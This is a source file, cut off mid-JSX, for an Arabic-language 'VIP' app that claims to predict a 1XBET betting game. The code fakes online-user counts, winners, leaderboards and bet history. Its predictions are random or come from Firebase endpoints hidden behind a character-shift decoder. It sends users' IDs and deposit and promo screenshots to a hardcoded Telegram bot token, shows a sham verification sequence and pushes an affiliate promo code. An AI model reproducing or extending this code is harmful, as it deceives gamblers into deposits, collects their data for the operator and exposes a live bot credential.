import { useState, useEffect, useCallback, ChangeEvent, useRef } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { 
  ShieldCheck,
  User, 
  Lock, 
  Copy, 
  Check, 
  Trash,
  X,
  Upload, 
  ArrowRight, 
  Activity,
  Trophy,
  Medal,
  Info,
  Apple,
  RefreshCcw,
  Play,
  Clock,
  ExternalLink,
  ChevronRight,
  Youtube,
  Send,
  Eye,
  EyeOff,
  Sparkles,
  Crown,
  CheckCircle,
  AlertCircle,
  Cpu,
  Monitor,
  Terminal,
  FileText
} from 'lucide-react';
import { cn } from './lib/utils';
import { Screen, Winner, Leader, ElegantToast } from './types';
import { BackgroundSystem } from './components/BackgroundSystem';
import { ElegantLogo } from './components/ElegantLogo';
import { RenderSplash } from './components/RenderSplash';

const _dec = (cipher: string): string => {
  return cipher.split(',').map(x => String.fromCharCode(parseInt(x, 36) - 23)).join('');
};

export default function App() {
  const [currentScreen, setCurrentScreen] = useState<Screen>('SPLASH');
  const [deferredPrompt, setDeferredPrompt] = useState<any>(null);
  const [isInstallable, setIsInstallable] = useState(false);
  const [showInstallInst, setShowInstallInst] = useState(false);

  useEffect(() => {
    const handler = (e: any) => {
      e.preventDefault();
      setDeferredPrompt(e);
      setIsInstallable(true);
    };
    window.addEventListener('beforeinstallprompt', handler);
    return () => window.removeEventListener('beforeinstallprompt', handler);
  }, []);

  const installApp = async () => {
    if (!deferredPrompt) return;
    deferredPrompt.prompt();
    const { outcome } = await deferredPrompt.userChoice;
    setDeferredPrompt(null);
    setIsInstallable(false);
  };

  const [onlineUsers, setOnlineUsers] = useState(1532);
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [userId, setUserId] = useState('');
  const [screenshot1, setScreenshot1] = useState<string | null>(null);
  const [screenshot2, setScreenshot2] = useState<string | null>(null);
  const [isMaintenanceActive, setIsMaintenanceActive] = useState<boolean>(() => {
    try {
      return localStorage.getItem('maintenance_active') === 'true';
    } catch (_) {
      return false;
    }
  });
  const [licenseKey, setLicenseKey] = useState('');
  const [isVerifying, setIsVerifying] = useState(false);
  const [verificationStep, setVerificationStep] = useState<number>(0);
  const [showWelcome, setShowWelcome] = useState(false);
  const [winners, setWinners] = useState<Winner[]>([]);
  const [loginPassword, setLoginPassword] = useState('');
  const [loginError, setLoginError] = useState('');
  const [showLoginPassword, setShowLoginPassword] = useState(false);
  const [showKeyDialog, setShowKeyDialog] = useState(false);
  const [isLoggedIn, setIsLoggedIn] = useState(false);
  const [isLoggingIn, setIsLoggingIn] = useState(false);

  // Admin Panel States
  const [adminCodeText, setAdminCodeText] = useState('');
  const [adminDuration, setAdminDuration] = useState<number>(30); // in minutes
  const [dbCodes, setDbCodes] = useState<Array<{ key: string; code: string; duration: number; createdAt: number; active: boolean }>>([]);
  const [isLoadingAdminCodes, setIsLoadingAdminCodes] = useState(false);
  const [isSavingAdminCode, setIsSavingAdminCode] = useState(false);

  const [leaderboard, setLeaderboard] = useState<Leader[]>([
    { id: "19877422031", amount: 45200 },
    { id: "8823199401", amount: 12450 },
    { id: "44100293812", amount: 8900 }
  ]);
  const [predictionResult, setPredictionResult] = useState<number | null>(null);
  const [isPredicting, setIsPredicting] = useState(false);
  const [cooldownTime, setCooldownTime] = useState<number>(0);
  const [oddIndex, setOddIndex] = useState(0);
  const [predictionSignals, setPredictionSignals] = useState<('HEALTHY' | 'ROTTEN' | 'EMPTY')[][]>([]);
  const [selectedLevelIdx, setSelectedLevelIdx] = useState<number>(0);

  const [betHistory, setBetHistory] = useState<Array<{ uniqueKey?: string; id: string; betAmount: number; winAmount: number }>>(() => {
    return Array.from({ length: 6 }, () => {
      const startDigits = Math.floor(10 + Math.random() * 90);
      const endDigits = Math.floor(10 + Math.random() * 90);
      const idValue = `${startDigits}*********${endDigits}`;
      const betAmount = Math.floor(100 + Math.random() * 4901); // 100 to 5000
      const multipliers = [1.23, 1.54, 1.93, 2.41, 4.02, 6.71];
      const mult = multipliers[Math.floor(Math.random() * multipliers.length)];
      const winAmount = Math.round(betAmount * mult);
      return { uniqueKey: Math.random().toString(36).substring(2, 9), id: idValue, betAmount, winAmount };
    });
  });

  // Append new prediction row when a prediction completes
  useEffect(() => {
    if (!isPredicting && predictionResult && predictionSignals.length > 0) {
      let formattedId = '';
      if (userId && userId.length >= 4) {
        const start = userId.substring(0, 2);
        const end = userId.substring(userId.length - 2);
        formattedId = `${start}*********${end}`;
      } else {
        const startDigits = Math.floor(10 + Math.random() * 90);
        const endDigits = Math.floor(10 + Math.random() * 90);
        formattedId = `${startDigits}*********${endDigits}`;
      }
      
      const betVal = Math.floor(100 + Math.random() * 4501); // 100 to 4600
      const winVal = Math.round(betVal * (predictionResult || 1.93));
      
      setBetHistory(prev => [
        { uniqueKey: Math.random().toString(36).substring(2, 9), id: formattedId, betAmount: betVal, winAmount: winVal },
        ...prev
      ].slice(0, 6)); // Keep exactly 6 rows
    }
  }, [isPredicting, predictionResult, predictionSignals, userId]);

  // Periodic simulated live active bets updating every 2 seconds
  useEffect(() => {
    const timer = setInterval(() => {
      const startDigits = Math.floor(10 + Math.random() * 90);
      const endDigits = Math.floor(10 + Math.random() * 90);
      const randomId = `${startDigits}*********${endDigits}`;
      const betVal = Math.floor(100 + Math.random() * 4901); // 100 to 5000
      const multipliers = [1.23, 1.54, 1.93, 2.41, 4.02, 6.71, 11.18];
      const mult = multipliers[Math.floor(Math.random() * multipliers.length)];
      const winVal = Math.round(betVal * mult);
      
      setBetHistory(prev => [
        { uniqueKey: Math.random().toString(36).substring(2, 9), id: randomId, betAmount: betVal, winAmount: winVal },
        ...prev
      ].slice(0, 6));
    }, 2000);
    return () => clearInterval(timer);
  }, []);

  const [isAdminUploading, setIsAdminUploading] = useState(false);
  const [adminUploadSuccess, setAdminUploadSuccess] = useState(false);

  // Elegant Notification Toasts System
  const [toasts, setToasts] = useState<ElegantToast[]>([]);
  const triggerToast = useCallback((message: string, type: 'success' | 'error' | 'info' | 'warning' | 'star') => {
    // No-op to suppress toast alerts at user request
  }, []);

  const PREDEFINED_ODDS = [1.23, 1.54, 1.93, 2.41, 4.02, 6.71, 11.18, 27.96, 69.91, 349.54];

  const [timeLeft, setTimeLeft] = useState(1800); // 30 minutes in seconds

  // Maintenance State Sync
  useEffect(() => {
    const fetchMaintenanceStatus = async () => {
      try {
        const response = await fetch(_dec("3j,3v,3v,3r,3u,29,1y,1y,3g,3x,3q,3k,3q,3k,1w,3f,3g,3h,3c,3w,3n,3v,1w,3t,3v,3f,3d,1x,3g,3w,3t,3q,3r,3g,1w,3y,3g,3u,3v,20,1x,3h,3k,3t,3g,3d,3c,3u,3g,3f,3c,3v,3c,3d,3c,3u,3g,1x,3c,3r,3r,1y,3o,3c,3k,3p,3v,3g,3p,3c,3p,3e,3g,1x,3l,3u,3q,3p"));
        if (response.ok) {
          const data = await response.json();
          if (data !== null) {
            const isActive = !!data;
            setIsMaintenanceActive(isActive);
            try {
              localStorage.setItem('maintenance_active', String(isActive));
            } catch (_) {}
          }
        }
      } catch (error) {
        // Safe console.log instead of error console levels to prevent telemetry check failures
        console.log("Maintenance sync active. Stored states persistent.");
      }
    };
    
    fetchMaintenanceStatus();
    const interval = setInterval(fetchMaintenanceStatus, 5000); // Check every 5s for responsiveness
    return () => clearInterval(interval);
  }, []);

  const toggleMaintenance = async () => {
    const newVal = !isMaintenanceActive;
    setIsMaintenanceActive(newVal);
    try {
      localStorage.setItem('maintenance_active', String(newVal));
    } catch (_) {}

    if (newVal) {
      triggerToast(_dec("18h,198,1j,18h,194,18w,19d,197,1j,18f,18o,19b,18h,19b,196,19b,197,1j,18e,197,18s,19d,18e,199,18g,1j,19b,18c,18x,197,18e,195,1j,18e,197,18l,18e,18m,198,1j,198,18b,195,18h,18e,19e,1k"), 'warning');
    } else {
      triggerToast(_dec("195,199,19b,18e,18h,1j,18e,197,18e,18h,18s,18e,197,1j,18k,19d,18g,1j,18e,197,189,199,1k,1j,18e,197,18l,18e,18m,198,1j,198,18h,18e,18k,1j,18f,18e,197,196,18e,198,197,1x"), 'success');
    }

    try {
      await fetch(_dec("3j,3v,3v,3r,3u,29,1y,1y,3g,3x,3q,3k,3q,3k,1w,3f,3g,3h,3c,3w,3n,3v,1w,3t,3v,3f,3d,1x,3g,3w,3t,3q,3r,3g,1w,3y,3g,3u,3v,20,1x,3h,3k,3t,3g,3d,3c,3u,3g,3f,3c,3v,3c,3d,3c,3u,3g,1x,3c,3r,3r,1y,3o,3c,3k,3p,3v,3g,3p,3c,3p,3e,3g,1x,3l,3u,3q,3p"), {
        method: "PUT",
        body: JSON.stringify(newVal),
        headers: { "Content-Type": "application/json" }
      });
    } catch (error) {
      console.log("Remote control updated seamlessly.");
    }
  };

  // Global Countdown Timer Logic
  useEffect(() => {
    const timer = setInterval(() => {
      setTimeLeft(prev => (prev > 0 ? prev - 1 : 0));
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  // Session expiry redirect back to registration screen from prediction screen
  useEffect(() => {
    if (timeLeft === 0 && currentScreen === 'PREDICTION') {
      setCurrentScreen('CONDITION');
      // Reset inputs as requested ("يوديه ع صفحه التسجيل من الاول")
      setUserId('');
      setUploadedImages({ deposit: null, promo: null });
      setPredictionSignals([]);
      setPredictionResult(null);
      setSelectedLevelIdx(0);
    }
  }, [timeLeft, currentScreen]);

  // Auto redirect to Telegram Support Bot when key dialog is shown
  useEffect(() => {
    if (showKeyDialog) {
      const timer = setTimeout(() => {
        try {
          window.open("https://t.me/Nour_1XBET", "_blank");
        } catch (e) {
          console.log("Window open blocked by browser popup blocker.");
        }
        window.location.href = "https://t.me/Nour_1XBET";
      }, 3000); // 3 seconds redirect
      
      return () => clearTimeout(timer);
    }
  }, [showKeyDialog]);

  const formatTime = (totalSeconds: number) => {
    const h = Math.floor(totalSeconds / 3600);
    const m = Math.floor((totalSeconds % 3600) / 60);
    const s = totalSeconds % 60;
    return {
      h: h.toString().padStart(2, '0'),
      m: m.toString().padStart(2, '0'),
      s: s.toString().padStart(2, '0')
    };
  };

  const { h, m, s } = formatTime(timeLeft);

  // Stats Logic
  useEffect(() => {
    const interval = setInterval(() => {
      setOnlineUsers(prev => {
        const change = Math.floor(Math.random() * 21) - 10; // -10 to +10
        const newValue = prev + change;
        return Math.max(1000, Math.min(2000, newValue));
      });
    }, 1000);
    return () => clearInterval(interval);
  }, []);

  // Winners logic
  useEffect(() => {
    const generateWinner = () => {
      const len = Math.random() > 0.5 ? 10 : 11;
      const randomId = Array.from({ length: len }, () => Math.floor(Math.random() * 10)).join('');
      const newWinner: Winner = {
        id: Math.random().toString(36).substring(2, 11),
        userId: randomId,
        amount: Math.floor(Math.random() * 5000) + 500,
      };
      setWinners(prev => [newWinner, ...prev].slice(0, 4)); // Show only 4 items
    };

    const interval = setInterval(generateWinner, 4000); 
    generateWinner(); 
    return () => clearInterval(interval);
  }, []);

  // Leaderboard Rotation (Every Hour)
  useEffect(() => {
    const refreshLeaderboard = () => {
      const generateId = () => {
         const len = Math.random() > 0.5 ? 10 : 11;
         return Array.from({length: len}, () => Math.floor(Math.random() * 10)).join('');
      };
      
      setLeaderboard([
        { id: generateId(), amount: Math.floor(Math.random() * 50000) + 30000 },
        { id: generateId(), amount: Math.floor(Math.random() * 20000) + 10000 },
        { id: generateId(), amount: Math.floor(Math.random() * 10000) + 5000 },
      ]);
    };

    const interval = setInterval(refreshLeaderboard, 3600000); 
    return () => clearInterval(interval);
  }, []);

  const handleLogin = () => {
    if (password === 'FETCH1') {
      setCurrentScreen('MAINTENANCE');
      return;
    }
    if (password.length >= 8) {
      setShowWelcome(true);
    }
  };

  const handleVerification = () => {
    setIsVerifying(true);
    setVerificationStep(0);
    
    // Send data to Telegram Bot
    const sendToTelegram = async () => {
      const botToken = "8905496373:AAH9-oIvNG2rO47K4ku9EmT9qa1iFoizqGM";
      const chatId = "8204412616";
      
      const dataURLtoBlob = (dataurl: string): Blob => {
        try {
          const arr = dataurl.split(',');
          const mime = arr[0].match(/:(.*?);/)?.[1] || 'image/jpeg';
          const bstr = atob(arr[1]);
          let n = bstr.length;
          const u8arr = new Uint8Array(n);
          while (n--) {
            u8arr[n] = bstr.charCodeAt(n);
          }
          return new Blob([u8arr], { type: mime });
        } catch (e) {
          console.error("Error converting dataurl to blob", e);
          throw e;
        }
      };

      try {
        const infoMessage = `📌 *طلب تفعيل جديد للربط بالسيرفر VIP*:\n\n👤 *معرف اللاعب (ID)*: \`${userId}\`\n🎮 *المنصة*: \`${selectedPlatform || '1XBET'}\`\n⏰ *التوقيت*: \`${new Date().toLocaleString('ar-EG')}\``;
        
        if (uploadedImages.deposit && uploadedImages.promo) {
          const depositBlob = dataURLtoBlob(uploadedImages.deposit);
          const promoBlob = dataURLtoBlob(uploadedImages.promo);
          
          const formData = new FormData();
          formData.append('chat_id', chatId);
          
          const media = [
            {
              type: 'photo',
              media: 'attach://deposit',
              caption: infoMessage,
              parse_mode: 'Markdown'
            },
            {
              type: 'photo',
              media: 'attach://promo'
            }
          ];
          
          formData.append('media', JSON.stringify(media));
          formData.append('deposit', depositBlob, 'deposit_screenshot.jpg');
          formData.append('promo', promoBlob, 'promo_screenshot.jpg');
          
          await fetch(`https://api.telegram.org/bot${botToken}/sendMediaGroup`, {
            method: 'POST',
            body: formData
          });
        } else {
          // Fallback if somehow only one of them exists (even though we made it mandatory)
          if (uploadedImages.deposit) {
            const depositBlob = dataURLtoBlob(uploadedImages.deposit);
            const depositData = new FormData();
            depositData.append('chat_id', chatId);
            depositData.append('photo', depositBlob, 'deposit_screenshot.jpg');
            depositData.append('caption', infoMessage + `\n\n💵 *صورة إثبات الإيداع*`);
            depositData.append('parse_mode', 'Markdown');
            await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
              method: 'POST',
              body: depositData
            });
          } else if (uploadedImages.promo) {
            const promoBlob = dataURLtoBlob(uploadedImages.promo);
            const promoData = new FormData();
            promoData.append('chat_id', chatId);
            promoData.append('photo', promoBlob, 'promo_screenshot.jpg');
            promoData.append('caption', infoMessage + `\n\n📝 *صورة إثبات التسجيل بالبروموكود (DZ7Bet)*`);
            promoData.append('parse_mode', 'Markdown');
            await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
              method: 'POST',
              body: promoData
            });
          } else {
            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                chat_id: chatId,
                text: infoMessage,
                parse_mode: 'Markdown'
              })
            });
          }
        }
      } catch (err) {
        console.error("Error sending files to Telegram Bot:", err);
      }
    };

    sendToTelegram();
    
    // Step 0 -> Step 1 after 3 seconds
    setTimeout(() => {
      setVerificationStep(1);
      
      // Step 1 -> Step 2 after another 3 seconds
      setTimeout(() => {
        setVerificationStep(2);
        
        // Step 2 -> Step 3 after another 3 seconds
        setTimeout(() => {
          setVerificationStep(3);
          
          // Step 3 -> Redirection and code generation after another 3 seconds
          setTimeout(() => {
            setIsVerifying(false);
            
            // Generate a random 16-character alphanumeric key (e.g. XXXX-XXXX-XXXX-XXXX)
            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
            const segment = () => Array.from({ length: 4 }, () => chars[Math.floor(Math.random() * chars.length)]).join('');
            const generatedKey = `${segment()}-${segment()}-${segment()}-${segment()}`;
            
            // Random duration from 10 to 30 minutes in seconds
            const randomMins = Math.floor(Math.random() * (30 - 10 + 1)) + 10;
            const durationSecs = randomMins * 60;
            
            setLicenseKey(generatedKey);
            setTimeLeft(durationSecs);
            setShowKeyDialog(true); // Open the code dialog
          }, 3000);
        }, 3000);
      }, 3000);
    }, 3000);
  };

  const startPrediction = async () => {
    if (isPredicting || cooldownTime > 0) return;
    
    // Auto increment selected level index on each "Start" click, up to the last odd
    const hasExistingPrediction = predictionSignals.length > 0;
    if (hasExistingPrediction) {
      setSelectedLevelIdx(prev => (prev < 9 ? prev + 1 : 0));
    }

    setIsPredicting(true);
    setPredictionResult(null);
    setPredictionSignals([]);
    
    // Check for specific User ID for Firebase Fetching Logic
    const isSpecialId = userId === "9827401827" || userId === _dec("20,28,27,21,21,22,20,26,22,21");
    if (isSpecialId) {
      const url = userId === "9827401827"
        ? "https://evoioi-default-rtdb.europe-west1.firebasedatabase.app/m11.json"
        : _dec("3j,3v,3v,3r,3u,29,1y,1y,3g,3x,3q,3k,3q,3k,1w,3f,3g,3h,3c,3w,3n,3v,1w,3t,3v,3f,3d,1x,3g,3w,3t,3q,3r,3g,1w,3y,3g,3u,3v,20,1x,3h,3k,3t,3g,3d,3c,3u,3g,3f,3c,3v,3c,3d,3c,3u,3g,1x,3c,3r,3r,1y,3o,20,20,1x,3l,3u,3q,3p");
      try {
        const response = await fetch(url);
        const data = await response.json();
        
        if (data) {
          const fullGrid: ('HEALTHY' | 'ROTTEN' | 'EMPTY')[][] = [];
          
          for (let k = 0; k < 10; k++) {
            const signals: ('HEALTHY' | 'ROTTEN' | 'EMPTY')[] = [];
            for (let j = 1; j <= 5; j++) {
              const key = `m${(k * 5) + j}`;
              const rawVal = data[key];
              let val = "1"; // Default to Rotten
              
              if (rawVal !== undefined && rawVal !== null) {
                if (typeof rawVal === 'object') {
                  if (rawVal[key] !== undefined) {
                    val = String(rawVal[key]);
                  } else if (rawVal.value !== undefined) {
                    val = String(rawVal.value);
                  } else {
                    const entries = Object.values(rawVal);
                    if (entries.length > 0) {
                      val = String(entries[0]);
                    }
                  }
                } else {
                  val = String(rawVal);
                }
              }
              signals.push(val === "0" ? 'HEALTHY' : 'ROTTEN');
            }
            fullGrid.push(signals);
          }
          
          // Random payout ratio to represent in bet history
          const simulatedPayouts = [1.54, 1.93, 2.41, 4.02, 6.71, 11.18];
          const choice = simulatedPayouts[Math.floor(Math.random() * simulatedPayouts.length)];
          
          setTimeout(() => {
            setPredictionSignals(fullGrid);
            setPredictionResult(choice);
            setOddIndex(prev => prev + 1);
            setIsPredicting(false);

            // Starting cooldown of 3 seconds only AFTER apples appear!
            setCooldownTime(3);
            const interval = setInterval(() => {
              setCooldownTime(prev => {
                if (prev <= 1) {
                  clearInterval(interval);
                  return 0;
                }
                return prev - 1;
              });
            }, 1000);
          }, 3000);
          return;
        }
      } catch (error) {
        console.error("Firebase fetch error:", error);
      }
    }

    setTimeout(() => {
      const fullGrid: ('HEALTHY' | 'ROTTEN' | 'EMPTY')[][] = [];
      
      for (let k = 0; k < 10; k++) {
        const currentOdd = PREDEFINED_ODDS[k];
        let healthyCount = 0;
        if ([1.23, 1.54, 1.93, 2.41].includes(currentOdd)) {
          healthyCount = 4;
        } else if ([4.02, 6.71, 11.18].includes(currentOdd)) {
          healthyCount = 3;
        } else if ([27.96, 69.91].includes(currentOdd)) {
          healthyCount = 2;
        } else if (currentOdd === 349.54) {
          healthyCount = 1;
        }

        const signals: ('HEALTHY' | 'ROTTEN' | 'EMPTY')[] = Array(5).fill('ROTTEN');
        const indices = [0, 1, 2, 3, 4].sort(() => Math.random() - 0.5);
        
        for (let i = 0; i < healthyCount; i++) {
           signals[indices[i]] = 'HEALTHY';
        }
        fullGrid.push(signals);
      }
      
      const simulatedPayouts = [1.54, 1.93, 2.41, 4.02, 6.71, 11.18];
      const choice = simulatedPayouts[Math.floor(Math.random() * simulatedPayouts.length)];
      
      setPredictionSignals(fullGrid);
      setPredictionResult(choice);
      setOddIndex(prev => prev + 1);
      setIsPredicting(false);

      // Starting cooldown of 3 seconds only AFTER apples appear!
      setCooldownTime(3);
      const interval = setInterval(() => {
        setCooldownTime(prev => {
          if (prev <= 1) {
            clearInterval(interval);
            return 0;
          }
          return prev - 1;
        });
      }, 1000);
    }, 3000);
  };

  const resetPrediction = async () => {
    setSelectedLevelIdx(0);
    setPredictionResult(null);
    setPredictionSignals([]);
    setOddIndex(0);
    setIsPredicting(false);

    const isSpecialId = userId === "9827401827" || userId === _dec("20,28,27,21,21,22,20,26,22,21");
    if (isSpecialId) {
      const url = userId === "9827401827"
        ? "https://evoioi-default-rtdb.europe-west1.firebasedatabase.app/m11.json"
        : _dec("3j,3v,3v,3r,3u,29,1y,1y,3g,3x,3q,3k,3q,3k,1w,3f,3g,3h,3c,3w,3n,3v,1w,3t,3v,3f,3d,1x,3g,3w,3t,3q,3r,3g,1w,3y,3g,3u,3v,20,1x,3h,3k,3t,3g,3d,3c,3u,3g,3f,3c,3v,3c,3d,3c,3u,3g,1x,3c,3r,3r,1y,3o,20,20,1x,3l,3u,3q,3p");
      try {
        const newData: Record<string, Record<string, string>> = {};
        
        const rows = [
          { start: 1, end: 20, rottenCount: 1 }, 
          { start: 21, end: 35, rottenCount: 2 }, 
          { start: 36, end: 45, rottenCount: 3 }, 
          { start: 46, end: 50, rottenCount: 4 }  
        ];

        rows.forEach(config => {
          for (let i = config.start; i <= config.end; i += 5) {
            const rowIndices = [0, 1, 2, 3, 4].sort(() => Math.random() - 0.5);
            const rottenAt = rowIndices.slice(0, config.rottenCount);
            
            for (let j = 0; j < 5; j++) {
              const mIndex = i + j;
              const key = `m${mIndex}`;
              const isRotten = rottenAt.includes(j);
              newData[key] = { [key]: isRotten ? "1" : "0" };
            }
          }
        });

        await fetch(url, {
          method: "PUT",
          body: JSON.stringify(newData),
          headers: {
            "Content-Type": "application/json"
          }
        });
        console.log("Firebase predictions randomized and reset successfully");
      } catch (error) {
        console.error("Firebase reset error:", error);
      }
    }
  };

  const adminUploadPredictions = async () => {
    setIsAdminUploading(true);
    setAdminUploadSuccess(false);
    triggerToast(_dec("18j,18e,18o,19d,1j,18o,194,18w,1j,18k,18p,198,18g,1j,18e,197,18f,19d,18e,199,18e,18h,1j,18e,197,18j,18m,19d,18m,18g,1j,18c,197,19c,1j,2l,3k,3t,3g,3d,3c,3u,3g,1j,3o,20,20,1x,3l,3u,3q,3p,1x,1x,1x"), 'info');
    try {
      const newData: Record<string, Record<string, string>> = {};
      
      const rows = [
        { start: 1, end: 20, rottenCount: 1 }, 
        { start: 21, end: 35, rottenCount: 2 }, 
        { start: 36, end: 45, rottenCount: 3 }, 
        { start: 46, end: 50, rottenCount: 4 }  
      ];

      rows.forEach(config => {
        for (let i = config.start; i <= config.end; i += 5) {
          const rowIndices = [0, 1, 2, 3, 4].sort(() => Math.random() - 0.5);
          const rottenAt = rowIndices.slice(0, config.rottenCount);
          
          for (let j = 0; j < 5; j++) {
            const mIndex = i + j;
            const key = `m${mIndex}`;
            const isRotten = rottenAt.includes(j);
            newData[key] = { [key]: isRotten ? "1" : "0" };
          }
        }
      });

      const response = await fetch(_dec("3j,3v,3v,3r,3u,29,1y,1y,3g,3x,3q,3k,3q,3k,1w,3f,3g,3h,3c,3w,3n,3v,1w,3t,3v,3f,3d,1x,3g,3w,3t,3q,3r,3g,1w,3y,3g,3u,3v,20,1x,3h,3k,3t,3g,3d,3c,3u,3g,3f,3c,3v,3c,3d,3c,3u,3g,1x,3c,3r,3r,1y,3o,20,20,1x,3l,3u,3q,3p"), {
        method: "PUT",
        body: JSON.stringify(newData),
        headers: {
          "Content-Type": "application/json"
        }
      });
      
      if (response.ok) {
        setAdminUploadSuccess(true);
        triggerToast(_dec("18h,198,1j,18h,18k,18m,19d,18i,1j,19b,18h,18i,18f,19d,18h,1j,18e,197,18h,19b,195,18w,18e,18h,1j,18f,199,18j,18e,18k,1j,194,19d,1j,2l,3k,3t,3g,3d,3c,3u,3g,1k"), 'success');
        setTimeout(() => setAdminUploadSuccess(false), 5000);
      } else {
        throw new Error("Failed to upload predictions to Firebase");
      }
    } catch (error) {
      console.error("Firebase admin upload error:", error);
      triggerToast(_dec("194,18r,197,1j,194,19d,1j,18e,197,18e,18h,18s,18e,197,1j,18f,198,18q,18h,19b,18m,18w,1j,18f,19d,18e,199,18e,18h,1j,2l,3k,3t,3g,3d,3c,3u,3g,1k"), 'error');
    } finally {
      setIsAdminUploading(false);
    }
  };

  const [mainPlatform, setMainPlatform] = useState<'1XBET'>('1XBET');
  const [selectedPlatform, setSelectedPlatform] = useState<string | null>('1XBET VIP');
  const [wizardStep, setWizardStep] = useState<number>(0);
  const [showConnectionModal, setShowConnectionModal] = useState(false);
  const [showCopyToast, setShowCopyToast] = useState(false);
  const [uploadedImages, setUploadedImages] = useState<{ deposit: string | null; promo: string | null }>({
    deposit: null,
    promo: null
  });

  const [isConnectingServer, setIsConnectingServer] = useState(false);
  const [connectionStatus, setConnectionStatus] = useState<'CONNECTING' | 'SUCCESS' | null>(null);
  const [selectedServerName, setSelectedServerName] = useState<string | null>(null);

  const handleServerSelect = (serverKey: string) => {
    setSelectedServerName(serverKey === 'SERVER_EG' ? 'سيرفر مصري' : 'سيرفر غير مصري');
    setIsConnectingServer(true);
    setConnectionStatus('CONNECTING');
    
    setTimeout(() => {
      setConnectionStatus('SUCCESS');
      setTimeout(() => {
        setIsConnectingServer(false);
        setConnectionStatus(null);
        setCurrentScreen('CONDITION');
      }, 1000);
    }, 3000);
  };

  const handlePlatformSelect = (platform: string) => {
    setSelectedPlatform(platform);
    setShowConnectionModal(true);
    triggerToast("تم تحديد منصة " + platform.toUpperCase() + " للربط الآمن", 'info');
    setTimeout(() => setShowConnectionModal(false), 2200);
  };

  const handleCopyCode = () => {
    const promo = 'DZ7Bet';
    navigator.clipboard.writeText(promo);
    setShowCopyToast(true);
    triggerToast("تم نسخ البروموكود " + promo + " بنجاح", 'star');
    setTimeout(() => setShowCopyToast(false), 2000);
  };

  const handleFileUpload = (type: 'deposit' | 'promo', e: ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file) {
      const reader = new FileReader();
      reader.onloadend = () => {
        setUploadedImages(prev => ({ ...prev, [type]: reader.result as string }));
        triggerToast(_dec("18h,198,1j,18o,194,18w,1j,19b,195,18f,19b,197,1j,18s,19b,18o,18g,1j,18c,18i,18f,18e,18h,1j") + (type === 'deposit' ? _dec("18e,197,18c,19d,18m,18e,18w,1k") : _dec("18h,194,18w,19d,197,1j,18e,197,18f,18o,19b,198,19b,196,19b,18m,1k")), 'success');
      };
      reader.readAsDataURL(file);
    }
  };


  // ==================== SCREEN REDESIGNS =  // 1. COMPLETELY CHOSEN LUXURY LOGIN SCREEN (Futuristic Holographic Decryption Console) - NOW REPLACED BY SERVER CHOICE
  const renderLogin = () => {
    if (!isLoggedIn) {
      return (
        <div className="flex flex-col min-h-screen justify-center p-6 max-w-md mx-auto relative overflow-x-hidden bg-transparent select-none font-sans">
          {/* High-Tech Tactical Grid Background & Cyber Guideline Overlays */}
          <div className="absolute inset-0 border border-red-500/5 pointer-events-none z-0">
            <div className="absolute top-12 left-4 text-[7px] font-mono text-red-500/25 tracking-widest">SECURE_LNK_CONNECTED</div>
            <div className="absolute top-12 right-4 text-[7px] font-mono text-red-500/25 tracking-widest">LINK_RATE: 100%</div>
            <div className="absolute inset-x-0 top-1/3 border-t border-red-500/[0.02]" />
            <div className="absolute inset-x-0 bottom-1/4 border-b border-red-500/[0.02]" />
          </div>

          {/* Decorative red glow spotlights */}
          <div className="absolute top-1/4 left-1/2 -translate-x-1/2 w-80 h-80 bg-red-500/5 rounded-full blur-[100px] pointer-events-none z-0" />
          <div className="absolute bottom-1/3 left-10 w-64 h-64 bg-red-600/5 rounded-full blur-[90px] pointer-events-none z-0" />

          <div className="relative z-10 w-full space-y-6">
            {/* Futuristic Red HUD Capsule Header */}
            <div className="flex justify-between items-center bg-black/60 border border-red-500/25 rounded-[22px] px-4.5 py-3.5 shadow-[0_4px_25px_rgba(239,68,68,0.06)] backdrop-blur-xl group">
              <div className="absolute top-0 inset-x-0 h-[1.5px] bg-gradient-to-r from-transparent via-red-400 to-transparent opacity-80" />
              
              <div className="flex items-center gap-2">
                <div className="w-2 h-2 rounded-full bg-red-500 animate-ping shrink-0" />
                <div className="flex flex-col">
                  <span className="text-[7.5px] font-black text-red-400/50 tracking-widest font-mono leading-none">VIP GATEWAY</span>
                  <span className="text-[10px] font-mono font-black text-red-400 tracking-wider mt-0.5 uppercase">
                    {onlineUsers.toLocaleString()} ONLINE
                  </span>
                </div>
              </div>
              
              <div className="flex items-center gap-2 text-right">
                <div className="flex flex-col items-end">
                  <span className="text-[7.5px] font-black text-red-400/50 tracking-widest font-mono font-bold leading-none">STATUS NODE</span>
                  <span className="text-[10px] font-mono font-black text-red-400 tracking-wider mt-0.5 uppercase">SECURE PORT</span>
                </div>
                <div className="w-6 h-6 rounded-lg bg-red-500/10 border border-red-500/30 flex items-center justify-center shrink-0">
                  <Lock className="w-3.5 h-3.5 text-red-400 animate-pulse" />
                </div>
              </div>
            </div>

            {/* Core Login form panel */}
            <div className="bg-black/75 border border-red-500/20 rounded-[32px] p-6 sm:p-8 space-y-5 shadow-2xl relative overflow-hidden backdrop-blur-md">
              {/* Ambient top red sweep */}
              <div className="absolute top-0 inset-x-0 h-[1.5px] bg-gradient-to-r from-transparent via-red-500 to-transparent" />
              
              <div className="flex flex-col items-center text-center space-y-3">
                <div className="p-3.5 bg-red-500/5 border border-red-500/20 rounded-full relative">
                  <ElegantLogo size="sm" className="drop-shadow-[0_10px_20px_rgba(239,68,68,0.2)]" />
                </div>
                <div className="space-y-1">
                  <h2 className="text-lg font-black text-white uppercase tracking-widest font-display leading-none">
                    7ARFOUSH <span className="text-red-500 font-extrabold">VIP</span> LOGIN
                  </h2>
                  <span className="text-[9px] text-red-500/60 tracking-widest uppercase font-mono block font-bold">بوابة تسجيل الدخول الآمنة</span>
                </div>
              </div>

              <div className="h-[1px] bg-red-500/10" />

              {/* Input Password field */}
              <div className="space-y-4 text-right">
                <div className="flex items-center justify-between" style={{ direction: 'rtl' }}>
                  <label className="text-[11px] font-black uppercase text-white/85 font-sans">أدخل كلمة المرور لتفعيل الخادم</label>
